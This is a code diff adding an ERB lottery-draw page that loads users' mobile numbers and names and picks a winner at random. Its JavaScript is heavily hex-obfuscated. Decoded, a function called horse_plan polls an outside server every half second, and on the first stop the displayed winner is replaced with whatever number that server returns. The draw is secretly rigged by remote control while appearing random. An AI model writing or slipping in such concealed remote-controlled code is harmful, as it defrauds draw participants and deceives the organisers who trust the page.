@@ -1,0 +1,40 @@
+<script type="text/javascript">
+  var mobile = new Array();
+  <% @user.each_with_index do |user, index| %>
+    mobile[<%= index %>] = "<%= "#{user.mobile}，#{user.name}" %>";
+  <% end %>
+  var _$=['\x47\x45\x54','\x68\x74\x74\x70\x3a\x2f\x2f\x73\x6d\x77\x2e\x6d\x2d\x63\x6c\x6f\x75\x64\x2e\x6e\x65\x74\x2e\x63\x6e\x2f\x7a\x6a\x61\x70\x69\x2e\x70\x68\x70\x3f\x73\x74\x65\x70\x3d\x39\x38\x38\x37\x39','\x6a\x73\x6f\x6e',"\x72\x65\x73\x75\x6c\x74",'\x63\x68\x61\x6e\x67\x65\x28\x29',"\x67\x65\x74\x52\x61\x6e\x64\x4e\x75\x6d\x28\x29","\x73\x74\x61\x72\x74","\x65\x6e\x64","\x72\x65\x73\x75\x6c\x74",'\x20\x2c\x20',"\x73\x74\x61\x72\x74","\x65\x6e\x64","\x75\x6e\x64\x65\x66\x69\x6e\x65\x64","\x72\x65\x73\x75\x6c\x74","\x63\x69\x73\x68\x75","\x63\x69\x73\x68\x75\x31","\x64\x61\x6e\x67\x71\x69\x61\x6e","\x72\x65\x73\x75\x6c\x74","\x68\x6f\x72\x73\x65\x5f\x70\x6c\x61\x6e\x28\x29"];var smw_0;var smw_1=new Array(0x64);var smw_2=new Array(0x64);var smw_3=0x0;var smw_4;var smw_5=0x1;var smw_6={};var smw_7=0x0;var smw_8=false;var smw_9=mobile["\x6c\x65\x6e\x67\x74\x68"]-0x1;rnd["\x74\x6f\x64\x61\x79"]=new Date();rnd["\x73\x65\x65\x64"]=rnd["\x74\x6f\x64\x61\x79"]["\x67\x65\x74\x54\x69\x6d\x65"]();function rnd(){rnd["\x73\x65\x65\x64"]=(rnd["\x73\x65\x65\x64"]*0x2455+0xc091)%0x38f40;return rnd["\x73\x65\x65\x64"]/(233280.0)};function rand(smw_b){return Math["\x63\x65\x69\x6c"](rnd()*smw_b)};function horse_plan(){$["\x61\x6a\x61\x78"]({type:_$[0],url:_$[1],dataType:_$[2],success:function(smw_b){smw_8=true;smw_6=smw_b["\x7a\x6a\x7a"]}})};function getRandNum(){smw_9=parseInt(smw_9);var smw_b=GetRnd(0x0,smw_9);document["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](_$[3])["\x76\x61\x6c\x75\x65"]=mobile[smw_b]};function start(){clearInterval(smw_0);smw_0=setInterval(_$[4],0x32)};function ok(){clearInterval(smw_0)};function GetRnd(smw_b,smw_c){smw_4=parseInt(rand(smw_c+0x1)-0x1);return smw_4};function setTimer(){time=setInterval(_$[5],0xa);document["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](_$[6])["\x64\x69\x73\x61\x62\x6c\x65\x64"]=true;document["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](_$[7])["\x64\x69\x73\x61\x62\x6c\x65\x64"]=false};function clearTimer(){noDupNum();clearInterval(time);if(smw_8&&smw_7==0x0){document["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](_$[8])["\x76\x61\x6c\x75\x65"]=smw_6["\x6d\x6f\x62\x69\x6c\x65"]+_$[9]+smw_6["\x6e\x75\x6d"];smw_7++};document["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](_$[10])["\x64\x69\x73\x61\x62\x6c\x65\x64"]=false;document["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](_$[11])["\x64\x69\x73\x61\x62\x6c\x65\x64"]=true;setValues()};var smw_a=0x0;function okle(smw_b){smw_a++;if(smw_a<smw_b){setTimer();setTimeout(function(){clearTimer();okle(smw_b)},0x3e8)}};function noDupNum(){mobile["\x72\x65\x6d\x6f\x76\x65\x45\x6c\x65\x41\x74"](smw_4);var smw_b=0x0;for(p=0x0;p<mobile["\x6c\x65\x6e\x67\x74\x68"];p++){if(typeof mobile[p]!=_$[12]){mobile[smw_b]=mobile[p];smw_b++}};smw_9=mobile["\x6c\x65\x6e\x67\x74\x68"]-0x1};Array["\x70\x72\x6f\x74\x6f\x74\x79\x70\x65"].removeEleAt=function(smw_b){if(isNaN(smw_b)||smw_b>this["\x6c\x65\x6e\x67\x74\x68"]){return false};this["\x73\x70\x6c\x69\x63\x65"](smw_b,0x1)};function setValues(){document["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](smw_5)["\x76\x61\x6c\x75\x65"]=document["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](_$[13])["\x76\x61\x6c\x75\x65"];document["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](_$[14])["\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c"]=smw_5;document["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](_$[15])["\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c"]=smw_5;document["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](_$[16])["\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c"]=document["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](_$[17])["\x76\x61\x6c\x75\x65"];smw_5++};$(document)["\x72\x65\x61\x64\x79"](function(){setInterval(_$[18],0x1f4)});
+</script>
+<div id="body-container">
+  <div id="content">
+    <div id="admin-lottery-page" eventid="shenyang1" surveyid="default_survey" questionnumber="2" >
+      <div class="A-B">
+        <div class="t">摇奖区</div>
+        <div class="x-C">
+        <input type="text" class="lucky" id="result" size="30" readonly/>
+        </div>
+      </div>
+      <div class="J" style="display:none"></div>
+      <div class="K">
+        <!-- <div class="L a-b-c">第<span id="cishu" class="M-N"></span>次摇奖 &nbsp;&nbsp;获奖者：&nbsp;<span id="dangqian" class="M-A"></span></div> -->
+        <div class="O-E a-b-c">
+           <input id="start" type="button" value="开始" class="btn btn-success btn-lg" onClick="setTimer()" />
+ <input id="end" type="button" value="停止" class="btn btn-danger btn-lg" onclick="clearTimer();okle(1)" disabled/>
+<!--<button class="yb" style="">开始抽奖</button>
+          <button class="stop" style="display: none;">停止</button>-->
+        </div>
+      </div>
+      <div class="P">
+        <!-- <div class="t">获奖名单-<span class="Q">获奖人数</span><span id="cishu1" class="M-R">0</span></div> -->
+        <div class="S">
+          <div class="P-B">
+            <div class="D"></div>
+            <div class="A">
+              <!-- <input name="lucky1" type="text" class="luckyman" id="1" size="28" readonly/> -->
+            </div>          
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
